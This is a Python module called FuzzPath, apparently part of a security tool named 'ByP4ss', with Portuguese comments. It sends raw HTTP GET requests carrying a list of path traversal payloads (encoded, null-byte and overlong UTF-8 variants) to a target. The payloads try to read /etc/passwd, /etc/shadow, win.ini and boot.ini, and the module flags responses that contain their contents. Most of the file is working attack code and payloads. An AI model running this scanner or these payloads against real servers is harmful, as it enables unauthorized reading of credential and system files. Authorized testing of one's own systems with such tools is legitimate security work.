# FuzzPath do ByP4ss
# Testa path traversal (../), null byte, UTF-8 overlong, tenta ler /etc/passwd.
# Chamado por FuzzEngine: Mod.Testar(Alvo, Iteracoes) -> dict
#
# Nao executa comando. So HTTP GET.

import time
import socket

from Core.Config import Config
from Core.Log import Log


class FuzzPath:

    PAYLOADS = [
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "..%2fetc%2fpasswd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e/etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..;/..;/..;/etc/passwd",
        "..%00/etc/passwd",
        "..%2500/etc/passwd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
        "/etc/passwd",
        "/etc/passwd%00",
        "/etc/passwd%2500",
        "../../../../etc/shadow",
        "../../../windows/win.ini",
        "../../../boot.ini",
    ]
    PATHS_BASE = ["/", "/static/", "/images/", "/download/", "/files/", "/cgi-bin/"]
    INDICIOS_PASSWD = [
        "root:x:", "root:*:", "daemon:", "/bin/bash", "/bin/sh",
        "/sbin/nologin",
    ]
    INDICIOS_WIN = ["[extensions]", "[fonts]", "for 16-bit app support"]
    TIMEOUT = 2.0

    @staticmethod
    def Testar(Alvo, Iteracoes):
        Resultado = {
            "ok": True, "tecnica": "path",
            "iteracoes": int(Iteracoes or 100),
            "crashes": [], "anomalias": [],
            "duracao_s": 0.0,
        }
        if not Alvo:
            Resultado["ok"] = False
            Resultado["motivo"] = "alvo_ausente"
            return Resultado
        Inicio = time.monotonic()
        Porta = 80
        Count = 0
        for Base in FuzzPath.PATHS_BASE:
            for Payload in FuzzPath.PAYLOADS:
                if Count >= Resultado["iteracoes"]:
                    break
                R = FuzzPath._TestarPath(Alvo, Porta, Base, Payload)
                Count += 1
                FuzzPath._Registrar(R, Base, Payload, Resultado)
            if Count >= Resultado["iteracoes"]:
                break
        Resultado["iteracoes"] = Count
        Resultado["duracao_s"] = round(time.monotonic() - Inicio, 2)
        return Resultado

    @staticmethod
    def _TestarPath(Alvo, Porta, Base, Payload):
        Sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Sock.settimeout(FuzzPath.TIMEOUT)
        try:
            if Sock.connect_ex((Alvo, Porta)) != 0:
                return {"ok": False, "motivo": "conexao_falhou"}
            Path = Base + Payload
            Req = (f"GET {Path} HTTP/1.0\r\n"
                   f"Host: {Alvo}\r\nConnection: close\r\n\r\n")
            Sock.sendall(Req.encode("utf-8", errors="replace"))
            Dados = Sock.recv(8192)
            return {
                "ok": True,
                "status": FuzzPath._Status(Dados),
                "tamanho": len(Dados),
                "corpo": Dados[:4096].decode("utf-8", errors="replace"),
            }
        except socket.timeout:
            return {"ok": False, "motivo": "timeout"}
        except Exception as E:
            return {"ok": False, "motivo": type(E).__name__}
        finally:
            try: Sock.close()
            except Exception: pass

    @staticmethod
    def _Status(Dados):
        if not Dados:
            return 0
        try:
            P = Dados.split(b"\r\n", 1)[0].decode("utf-8", errors="replace").split()
            if len(P) >= 2:
                return int(P[1])
        except Exception:
            pass
        return 0

    @staticmethod
    def _Registrar(R, Base, Payload, Resultado):
        if not R.get("ok"):
            if R.get("motivo") == "timeout":
                Resultado["anomalias"].append({
                    "tipo": "path_timeout", "path": (Base + Payload)[:60],
                })
            return
        Corpo = (R.get("corpo") or "").lower()
        if any(I in Corpo for I in FuzzPath.INDICIOS_PASSWD):
            Resultado["crashes"].append({
                "tipo": "path_traversal_passwd",
                "path": (Base + Payload)[:80],
                "status": R.get("status"),
                "evidencia": Corpo[:200],
            })
        elif any(I in Corpo for I in FuzzPath.INDICIOS_WIN):
            Resultado["crashes"].append({
                "tipo": "path_traversal_win",
                "path": (Base + Payload)[:80],
                "status": R.get("status"),
                "evidencia": Corpo[:200],
            })
        elif R.get("status", 0) >= 500 and "passwd" in Payload:
            Resultado["anomalias"].append({
                "tipo": "path_5xx_passwd",
                "path": (Base + Payload)[:80],
                "status": R.get("status"),
            })

    @staticmethod
    def Info():
        return {
            "nome": "FuzzPath",
            "payloads": len(FuzzPath.PAYLOADS),
            "bases": len(FuzzPath.PATHS_BASE),
        }
